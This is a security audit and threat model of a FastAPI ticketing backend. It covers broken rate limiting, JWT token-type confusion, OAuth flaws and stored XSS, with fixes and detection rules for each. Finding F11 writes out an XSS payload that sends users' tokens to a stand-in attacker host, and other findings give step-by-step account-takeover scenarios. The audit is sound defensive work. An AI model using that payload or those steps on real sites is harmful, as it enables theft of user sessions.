# Sound It Salone — Security Audit & Threat Model

**Date:** 2026-07-01  
**Scope:** FastAPI backend (`api/`, `auth.py`, `main*.py`, `config*.py`, `database*.py`, `models*.py`, `email_service.py`), React frontend (`app/`), Docker/Nginx/CI infrastructure  
**Assumption:** The live code paths are `main.py` / `main_production.py` with `config.py` / `database.py` (the `*_production.py` modules are currently unused).

---

## 1. Threat Model

### 1.1 Assets (what is worth attacking)

| Asset | Value | Typical Attacker Goal |
|---|---|---|
| User accounts + PII (email, phone, names, avatars) | High | Account takeover, identity theft, spam, social engineering |
| Organizer/Venue/Restaurant accounts & dashboards | Critical | Fraudulent events, stealing payouts, brand impersonation |
| Payment/order/ticket data | Critical | Free tickets, refund fraud, financial theft, event disruption |
| Admin/Super-admin capabilities | Critical | Full platform compromise, data exfiltration, malware distribution |
| JWT signing secret / DB credentials | Critical | Forge tokens, bypass all authz, dump database |
| Uploaded media (event flyers, avatars, recaps) | Medium | Malware hosting, phishing, defacement |
| Email/SMS gateway credentials | High | Phishing at scale, bill shock, reputation damage |

### 1.2 Attackers (likelihood per asset)

| Attacker Class | Motivation | Likelihood | Primary Targets |
|---|---|---|---|
| Script kiddies / credential stuffers | Easy mass compromise, resale | **High** | Login/OTP endpoints, password reset, leaked cred lists |
| Competitors / fraudsters | Financial gain, event disruption | **Medium-High** | Ticket inventory, organizer accounts, payouts |
| Insiders (organizers, support, devs) | Abuse privileged access | **Medium** | Admin endpoints, user data, commission/finance |
| Organized crime / nation-state | Financial scale, espionage | **Low-Medium** | Payment flows, PII bulk extraction, supply chain |

### 1.3 Entry Points

1. **Public API** (`/api/v1/*`) — 300+ routes; auth, payments, uploads, admin.
2. **Admin interface** (`/admin/*`, `/admin-stubs/*`) — high-value actions with role checks.
3. **OAuth callback** (`/api/v1/auth/google/callback`) — third-party identity provider flow.
4. **Third-party webhooks** — Monime, Orange Money, Stripe (payment status callbacks).
5. **Supply chain / infrastructure** — Docker base images, pip packages, GitHub Actions, `.env` history.
6. **Frontend** — React SPA talking to API; XSS via uploads/notifications, local-storage token theft.

---

## 2. Vulnerability Scan

### 2.1 Authentication — sessions, tokens, MFA

- [x] **Rate limiting is decorative.** `slowapi` limiters are instantiated on many routers but `SlowAPIMiddleware` is never added to the app, so all `@limiter.limit(...)` decorators are no-ops.
- [x] **JWT `type` claim is overwritten by `create_access_token()`.** Reset tokens intended to have `type=password_reset` become `type=access`, breaking the reset flow and allowing reset tokens to authenticate as access tokens.
- [x] **`get_current_user` does not enforce token type.** Any valid signed JWT with a `sub` claim (access, refresh, reset, future types) authenticates the caller.
- [x] **No refresh-token rotation, revocation, or device binding.** Refresh tokens are valid for 7 days and reused indefinitely.
- [x] **Password reset does not invalidate existing sessions/tokens.** After reset, old access/refresh tokens remain valid.
- [x] **OTP is 6-digit numeric with 10-minute life and no attempt counter/cooldown.** With rate limits disabled, brute-force is practical.
- [x] **OTP codes are printed to stdout.** `api/otp.py:219,224` logs the OTP and recipient email.
- [x] **Session middleware shares the JWT secret and uses empty default in dev.** `SessionMiddleware` is configured with `settings.SECRET_KEY` and no `same_site`/`https_only`.
- [x] **Organizer/venue registration bypasses server-side OTP verification.** `api/auth_password.py:165-262` trusts the frontend's claim that OTP was verified.
- [x] **Google OAuth tokens are returned in the redirect URL query string.** `api/google_auth.py:144` leaks tokens to browser history, referrers, and server logs.
- [x] **Google OAuth lacks `state` parameter.** `api/google_auth.py:39-49` is vulnerable to login CSRF/fixation.
- [x] **Email registration marks `is_verified=True` without email confirmation.** `api/auth_password.py:219-229` lets an attacker register a victim's email, then the victim's later Google OAuth login resolves to the attacker account.

### 2.2 Authorization — horizontal/vertical privilege escalation

- [x] **Token-type confusion enables privilege escalation.** A password-reset token for an admin user can be used as a bearer token to reach admin endpoints (`api/admin.py:get_current_admin` also calls `decode_token` without type check).
- [x] **Authorization is role-heavy, resource-light.** Many endpoints check role but not ownership; a venue owner can potentially mutate resources of other venues if endpoints accept IDs without `current_user.id` checks.
- [x] **String/enum role comparisons are inconsistent.** Some endpoints compare `current_user.role.value` to `"admin"`, others compare enum to enum; subtle bypasses are possible if the column stores a plain string.
- [x] **Broadcast endpoint injects unsanitized HTML.** `api/admin_stubs.py:100-104` embeds `data.message` directly into HTML email/notification content, enabling stored XSS in in-app notifications.

### 2.3 Input Handling — SQL, command, template injection

- [x] **No raw SQL injection in API code.** All API queries use SQLAlchemy ORM. `database.py` uses parameterized `text()` only for static DDL/indexes.
- [x] **No command/template injection vectors found.** No `eval`, `exec`, `os.system`, `subprocess`, or Jinja2 rendering of user input.
- [x] **File upload content-type trust.** `api/media.py` validates `UploadFile.content_type` (client-controlled) but does not inspect magic bytes, sanitize SVG, or enforce extension whitelist independently.
- [x] **Path traversal in upload folder is mitigated.** `folder` parameter is checked against an allowlist.
- [x] **PDF parsing in `restaurant_dashboard.py` uses `pypdf.extract_text()`.** No known RCE vector, but malformed PDFs could cause CPU/memory exhaustion.

### 2.4 Data Exposure — PII in logs, stack traces, debug endpoints

- [x] **OTP codes and user emails printed to logs.** `api/otp.py:219,224`.
- [x] **Production can start with `DEVELOPER_MODE=true` by default.** `config.py:115` defaults `DEVELOPER_MODE` to `true`; if unset, debug endpoints (`/docs`, `/redoc`, `/openapi.json`) and verbose SQL logging are enabled.
- [x] **Global exception handler hides stack traces in production.** `main_production.py:249-258` returns generic 500 messages.
- [x] **CORS fallback in production exposes localhost origins.** `main_production.py:125-136` allows broad local origins if `CORS_ORIGINS` is unset.
- [x] **`/verify-reset-token` is public and token-probes.** `api/auth_password.py:660-683` decodes any JWT and exposes the `sub` claim as `email` without checking token purpose.
- [x] **User settings endpoint leaks 2FA preference?** `/users/me/settings` returns `twoFactor` flag; not critical but enumerates security features.

### 2.5 Infrastructure — secrets, dependencies, TLS

- [x] **`.env` with Google OAuth secrets was historically committed and pushed.** Although now untracked, the secret remains in Git history and is flagged by GitHub push protection.
- [x] **`Dockerfile` uses non-root user and `.dockerignore` excludes env files.** Good.
- [x] **Nginx config uses TLS 1.2/1.3, HSTS, secure headers.** Good.
- [x] **Docker Compose pins DB/Redis to localhost ports and requires passwords.** Good.
- [x] **Celery services reference non-existent `tasks.py`.** Worker services will crash-loop; no real background queue exists.
- [x] **Dependencies are pinned.** `requirements.txt` uses `==` versions.
- [x] **No SRI / CSP on frontend?** (Out of backend scope but noted in architecture review.)

---

## 3. Detailed Findings


### F1 — Decorative Rate Limiting Enables Credential Stuffing & OTP Brute Force

| Field | Value |
|---|---|
| **Severity** | **Critical** |
| **CVSS-style** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` → **~9.4** |
| **Location** | `api/auth_password.py:27`, `api/otp.py:33`, `api/contact.py:17`, `api/admin.py:26`; `main.py` / `main_production.py` missing `SlowAPIMiddleware` |
| **CWE** | CWE-307, CWE-770, CWE-799 |

**Attack scenario**
1. Attacker automates POST `/api/v1/auth/login` with a leaked credential list (10k combos).
2. Because `Limiter` instances are never wired into the app via `SlowAPIMiddleware`, every request is processed.
3. Attacker also brute-forces `/api/v1/otp/verify` (1,000,000 6-digit codes) against a target email.
4. Successful guesses grant account takeover.

**Fix**
```python
# main.py / main_production.py
from slowapi import Limiter
from slowapi.util import get_remote_address
from slowapi.middleware import SlowAPIMiddleware

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_middleware(SlowAPIMiddleware)
```
Remove per-router `Limiter(...)` duplicates; use the shared `app.state.limiter` or FastAPI dependency.

**Verification**
- `curl` the login endpoint 10+ times in a second and expect `429 Too Many Requests`.
- Add an integration test that asserts rate-limit headers (`X-RateLimit-*`) and 429 responses.

**Detection**
- Alert on >5 failed logins per IP per minute.
- Alert on >10 OTP verify attempts per identifier per minute.

---

### F2 — Password-Reset Token Is Usable as an Access Token

| Field | Value |
|---|---|
| **Severity** | **Critical** |
| **CVSS-style** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → **~9.1** |
| **Location** | `auth.py:51-60` (overwrites `type`), `api/auth_password.py:474-477`, `auth.py:84-128` |
| **CWE** | CWE-639, CWE-287, CWE-345 |

**Attack scenario**
1. Attacker requests password reset for victim email → receives reset link/token.
2. Backend calls `create_access_token(data={"sub": ..., "nonce": ..., "type": "password_reset"})`.
3. `create_access_token()` forcefully sets `"type": "access"` before encoding.
4. Attacker sends the reset token as `Authorization: Bearer <reset_token>` to any authenticated endpoint.
5. `get_current_user()` calls `decode_token(token)` with no type check → returns victim user.
6. Attacker can now view tickets, orders, profile, admin data if victim is admin.

**Fix**
- Do not use `create_access_token()` for reset tokens. Create a dedicated helper that preserves `type` and uses a short expiry:
  ```python
  def create_single_use_token(data: dict, expires_delta: timedelta) -> str:
      to_encode = data.copy()
      to_encode.update({"exp": datetime.now(timezone.utc) + expires_delta})
      return jwt.encode(to_encode, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM)
  ```
- In `get_current_user`, `get_current_admin`, and `get_optional_user`, pass `token_type="access"` to `decode_token()`.
- Reject any token whose `type != "access"` at the auth layer.

**Verification**
- Generate a reset token; attempt to use it at `/api/v1/users/tickets` → expect `401`.
- Ensure `/api/v1/auth/password-reset` still works with a valid reset token.

**Detection**
- Log token `type` mismatches at `WARNING` level.
- Alert on access tokens with `type` other than `access`.

---

### F3 — Production Entry Point Can Run with Empty JWT Secret & Developer Mode On

| Field | Value |
|---|---|
| **Severity** | **Critical** |
| **CVSS-style** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → **~9.8** |
| **Location** | `main_production.py:19` imports from `config.py`; `config.py:42,115` |
| **CWE** | CWE-16, CWE-798, CWE-1192 |

**Attack scenario**
1. Operator deploys with `ENVIRONMENT=production` but forgets `SECRET_KEY` or `DEVELOPER_MODE`.
2. `config.py` defaults `DEVELOPER_MODE=true`, so `SECRET_KEY` validation is skipped and an empty secret is accepted.
3. `JWT_SECRET` falls back to the empty `SECRET_KEY`.
4. Anyone can sign valid JWTs locally (`jwt.encode(..., "", "HS256")`) and authenticate as any user, including admin.

**Fix**
- Make `SECRET_KEY` validation unconditional in `config.py` (remove the `DEVELOPER_MODE` gate).
- In `main_production.py`, refuse to start if `SECRET_KEY` is missing or < 32 chars.
- Default `DEVELOPER_MODE` to `false`.

**Verification**
- Start app with `SECRET_KEY=""` → expect immediate `ValueError`.
- Confirm `/docs` is disabled when `DEBUG=false` and `DEVELOPER_MODE=false`.

**Detection**
- Health-check endpoint should never report healthy if `SECRET_KEY` is empty.

---

### F4 — Organizer/Venue Registration Bypasses Server-Side OTP Verification

| Field | Value |
|---|---|
| **Severity** | **Critical** |
| **CVSS-style** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → **~9.1** |
| **Location** | `api/auth_password.py:165-262` (register endpoint) |
| **CWE** | CWE-287, CWE-306 |

**Attack scenario**
1. Attacker calls `POST /api/v1/auth/register` directly with `role=organizer` or `role=venue`.
2. The endpoint creates an active, verified organizer/venue account without verifying an OTP code server-side.
3. Attacker can now create fake events/venues, list tickets, and request payouts.

**Fix**
- Enforce server-side OTP verification for all privileged roles before `User` creation.
- Use the existing `verify_stored_otp()` helper in `api/otp.py`; require a valid `otp_code` field in `RegisterRequest` for non-`user` roles.
- Alternatively, mark privileged registrations as `status="pending"` until an admin or OTP verifies them.

**Verification**
- Register as `venue` without providing a valid OTP → expect `403` or `400`.
- Provide a valid OTP → account is created active.

**Detection**
- Flag any `organizer`/`venue`/`restaurant` account created without an associated verified OTP record.

---

### F5 — Google OAuth Tokens Leaked in Redirect URL and Flow Lacks CSRF Protection

| Field | Value |
|---|---|
| **Severity** | **High** |
| **CVSS-style** | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` → **~7.5** |
| **Location** | `api/google_auth.py:39-49` (no `state`), `api/google_auth.py:144` (tokens in URL) |
| **CWE** | CWE-598, CWE-352 |

**Attack scenario**
1. User completes Google OAuth; backend redirects to `https://frontend/auth/callback?token=...&refresh_token=...`.
2. The tokens are now in browser history, referrers sent to third-party sites, and any intermediate server logs.
3. An attacker who obtains the URL (history, shared computer, referrer leak) gains full account access.
4. Without `state`, an attacker can also force a victim to log into an attacker-controlled Google-bound account (login CSRF).

**Fix**
- Return tokens via secure, `HttpOnly`, `SameSite=Lax` cookies, or via a short-lived one-time code exchanged by frontend backend-channel POST.
- Generate a cryptographically random `state` at `/api/v1/auth/google/login`, store it in session/cache, and validate it in the callback.
- Never place bearer tokens in query strings.

**Verification**
- Capture the OAuth callback with a proxy; confirm no `token`/`refresh_token` query params.
- Attempt callback without/with wrong `state` → expect `403`.

**Detection**
- Alert on any request to `/auth/callback` containing `token=` in query string.

---

### F6 — Google OAuth Account Takeover via Unverified Email Registration

| Field | Value |
|---|---|
| **Severity** | **High** |
| **CVSS-style** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → **~8.1** |
| **Location** | `api/auth_password.py:219-229`, `api/google_auth.py:105-115` |
| **CWE** | CWE-287, CWE-290 |

**Attack scenario**
1. Attacker registers with victim's email address and a strong password.
2. `is_verified=True` is set immediately; no email confirmation is required.
3. Victim later clicks "Sign in with Google" using the same email.
4. `api/google_auth.py` finds the existing user by email and logs the attacker-created account in.
5. Victim is now locked out or unknowingly using an attacker-controlled account.

**Fix**
- Set `is_verified=False` for email registrations; require a verified OTP/email link before activation.
- In Google OAuth, if the linked user is not verified, require additional verification before binding.

**Verification**
- Register a new email → account status is `inactive`/`unverified` until OTP/email verification.
- Google login with an unverified email → requires verification step.

**Detection**
- Alert when an account's auth provider changes from `email` to `google` within 24 hours of creation.

---

### F7 — No Refresh-Token Rotation, Revocation, or Binding

| Field | Value |
|---|---|
| **Severity** | **High** |
| **CVSS-style** | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` → **~7.4** |
| **Location** | `auth.py:63-69`, `api/auth_password.py:421-451` |
| **CWE** | CWE-613, CWE-798 |

**Attack scenario**
1. Attacker steals a refresh token (XSS, log leak, device compromise).
2. The refresh token is valid for 7 days and can be used repeatedly to mint new access tokens.
3. There is no way to revoke it except changing the global `SECRET_KEY` (which invalidates all users).

**Fix**
- Store refresh tokens in DB (hashed) with `user_id`, `device_id`, `expires_at`, `revoked_at`.
- On refresh, rotate: issue new refresh token, revoke old one.
- Bind tokens to a device fingerprint / IP hash; reject mismatches.
- Provide a `/auth/logout` endpoint that revokes the calling refresh token and all access tokens by `jti`.

**Verification**
- Use a refresh token twice → second use is rejected.
- Logout → refresh token is rejected.

**Detection**
- Alert on refresh-token reuse (same token used after rotation).

---

### F8 — OTP Codes Are Logged to Console

| Field | Value |
|---|---|
| **Severity** | **High** |
| **CVSS-style** | `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **~7.1** |
| **Location** | `api/otp.py:219,224` |
| **CWE** | CWE-532, CWE-312 |

**Attack scenario**
1. Anyone with read access to container logs, CI output, or centralized logging sees plaintext OTP codes paired with email addresses.
2. Support staff, hosting provider, or a compromised log pipeline can take over accounts.

**Fix**
- Remove all `print(..., otp_code)` statements.
- Use `logger.info("OTP sent", extra={"identifier": email, "purpose": data.purpose})` without the code.
- Ensure log aggregation scrubs/masks PII and secrets.

**Verification**
- Run `grep -R "print.*otp\|print.*Code" api/` → no results.
- Inspect logs after sending OTP → code is absent.

**Detection**
- SIEM rule: alert when log line contains 6-digit code near an email address and the source is `otp.py`.

---

### F9 — Admin Authentication Relies on Type-Agnostic `decode_token`

| Field | Value |
|---|---|
| **Severity** | **High** |
| **CVSS-style** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` → **~8.1** |
| **Location** | `api/admin.py:49-109` |
| **CWE** | CWE-287, CWE-345 |

**Attack scenario**
1. Attacker obtains a password-reset token for an admin account (via F2 it is already `type=access`).
2. Calls `GET /api/v1/admin/...` with `Authorization: Bearer <reset token>`.
3. `get_current_admin()` calls `decode_token(token)` without type enforcement and loads the admin user.
4. Attacker can suspend users, change roles, approve events, broadcast messages.

**Fix**
- Same as F2: enforce `token_type="access"` in all auth dependencies (`get_current_user`, `get_current_admin`, `get_optional_user`).
- For admin actions, additionally require a recent authentication (e.g., `auth_time` claim within 15 minutes) or step-up MFA.

**Verification**
- Use a reset token against `/api/v1/admin/users` → expect `401`.

**Detection**
- Alert on admin endpoint access with non-access token `type`.

---

### F10 — File Upload Trusts Client Content-Type, Allows Malicious File Hosting

| Field | Value |
|---|---|
| **Severity** | **Medium** |
| **CVSS-style** | `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` → **~6.5** |
| **Location** | `api/media.py:24-45`, `api/media.py:78-117` |
| **CWE** | CWE-434, CWE-20 |

**Attack scenario**
1. Attacker uploads an SVG file with `content_type=image/png` (client-controlled).
2. File is saved as `uuid.png` but contains SVG/JS.
3. When served under `/static/uploads/...`, a browser may sniff/execute the content, leading to stored XSS or phishing.

**Fix**
- Validate magic bytes with `python-magic` or `filetype`.
- Sanitize SVG (remove `<script>`), or disallow SVG uploads.
- Serve uploads with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
- Rename files to a safe extension based on detected mime type, not original filename.

**Verification**
- Upload a `.svg` with `image/png` content-type → rejected.
- Upload a valid PNG → accepted and served with correct headers.

**Detection**
- Alert on uploaded files whose detected mime differs from declared content type.

---

### F11 — Broadcast/Notification Messages Allow Stored XSS

| Field | Value |
|---|---|
| **Severity** | **Medium** |
| **CVSS-style** | `AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N` → **~5.4** |
| **Location** | `api/admin_stubs.py:100-104` |
| **CWE** | CWE-79, CWE-80 |

**Attack scenario**
1. Admin (or compromised admin account) sends a broadcast with message `<img src=x onerror=fetch('https://attacker/?c='+localStorage.token)>`.
2. The message is inserted into HTML email and stored as an in-app notification.
3. Users viewing the notification execute the payload, leaking JWT tokens or performing actions.

**Fix**
- HTML-escape user-provided message before embedding in HTML (`html.escape` or Jinja2 autoescape).
- Use a notification template that treats message as plain text, or sanitize with `bleach`/`nh3`.

**Verification**
- Send broadcast with `<script>alert(1)</script>`; rendered email/notification contains escaped text.

**Detection**
- Scan notification content for HTML tags and alert.

---

### F12 — `/verify-reset-token` Publicly Probes Token Validity

| Field | Value |
|---|---|
| **Severity** | **Medium** |
| **CVSS-style** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **~5.3** |
| **Location** | `api/auth_password.py:660-683` |
| **CWE** | CWE-204, CWE-287 |

**Attack scenario**
1. Attacker finds or guesses reset tokens (e.g., from logs, referrer leaks).
2. Calls `GET /api/v1/auth/verify-reset-token?token=...`.
3. Endpoint decodes the token and returns `{valid: true, email: ...}` without checking nonce or type.
4. Attacker can enumerate valid tokens and user IDs.

**Fix**
- Remove this public endpoint, or require authentication to call it.
- If kept, verify `type == "password_reset"`, validate `nonce` against the user's stored nonce, and do not return the `email`.

**Verification**
- Request with a valid access token → `401`/no validity leak.
- Request with reset token for wrong nonce → `400`.

**Detection**
- Alert on repeated calls to `/verify-reset-token` from a single IP.


---

## 4. Top 3 Prioritized Fixes

> **Question:** *Which 3 fixes reduce the most risk with the least effort?*

### #1 — Enable Real Rate Limiting & Stop Logging OTP Codes

**Risk reduction:** Stops mass credential stuffing, OTP brute-force, password-spray attacks, and log-based OTP leakage. Closes the #1 exploitable weakness across the auth surface.  
**Effort:** Low — ~10 lines in `main.py` / `main_production.py`, remove 2 `print()` statements in `api/otp.py`.

**Changes**
1. Add `SlowAPIMiddleware` and a shared `app.state.limiter`.
2. Remove per-router `Limiter(...)` duplications.
3. Delete `api/otp.py:219` and `:224` OTP-code `print()` calls.

**Why first:** An unauthenticated attacker can exploit this *today* at scale with trivial tooling. Every other auth control (MFA, reset, OAuth) is weakened while rate limits are absent.

---

### #2 — Enforce Token Types and Use Dedicated Reset Tokens

**Risk reduction:** Prevents password-reset tokens from acting as access tokens, blocks privilege escalation to admin via token confusion, and closes the public token-probe endpoint.  
**Effort:** Medium — refactor `create_access_token()` to stop overwriting `type`, add `create_single_use_token()`, and pass `token_type="access"` in all auth dependencies.

**Changes**
1. `auth.py`: `create_access_token()` should not overwrite a caller-supplied `type`; better, split into separate helpers.
2. `api/auth_password.py`: use a dedicated reset-token helper that preserves `type="password_reset"`.
3. `get_current_user`, `get_optional_user`, `get_current_admin`: call `decode_token(..., token_type="access")`.
4. Harden or remove `/api/v1/auth/verify-reset-token`.

**Why second:** This is a critical authentication bypass. It allows account takeover and, for admin users, full platform compromise. The fix is localized to `auth.py` and the auth dependencies.

---

### #3 — Secure Google OAuth (state param, no tokens in URL, email verification)

**Risk reduction:** Prevents account takeover via pre-registered emails, stops token leakage through browser history/referrers, and blocks OAuth CSRF/fixation.  
**Effort:** Medium — modify `api/google_auth.py` (~40 lines) and adjust the frontend callback handler.

**Changes**
1. Generate and validate a random `state` parameter.
2. Return tokens via secure `HttpOnly` cookie or a one-time code, not query params.
3. Require email verification before marking email-registered accounts as `is_verified=True`.
4. In Google callback, require the matched email account to be verified or force verification.

**Why third:** Social login is a high-trust, high-impact path. The current implementation leaks long-lived bearer tokens and allows silent account hijacking. The fix is well-scoped to one router.

---

### What to do next week

After the top 3:
4. **Production hardening:** make `SECRET_KEY` validation unconditional and default `DEVELOPER_MODE=false`.
5. **Refresh-token lifecycle:** implement rotation, revocation, and device binding.
6. **File-upload security:** add magic-byte validation and safe serving headers.
7. **Broadcast XSS fix:** HTML-escape admin broadcast messages.
8. **Rotate exposed secrets:** the Google OAuth Client ID/Secret that was committed to Git history should be considered compromised and rotated in the Google Cloud Console.

---

## 5. Summary Risk Score

| Category | Critical | High | Medium | Low |
|---|---:|---:|---:|---:|
| Authentication | 4 | 4 | 1 | 1 |
| Authorization | 1 | 1 | 1 | 0 |
| Input Handling | 0 | 0 | 2 | 0 |
| Data Exposure | 1 | 2 | 2 | 0 |
| Infrastructure | 1 | 0 | 2 | 1 |

**Most severe systemic issues:** missing rate limiting, broken JWT token-type enforcement, and insecure OAuth flow. Fixing these three eliminates the majority of realistic account-takeover paths.
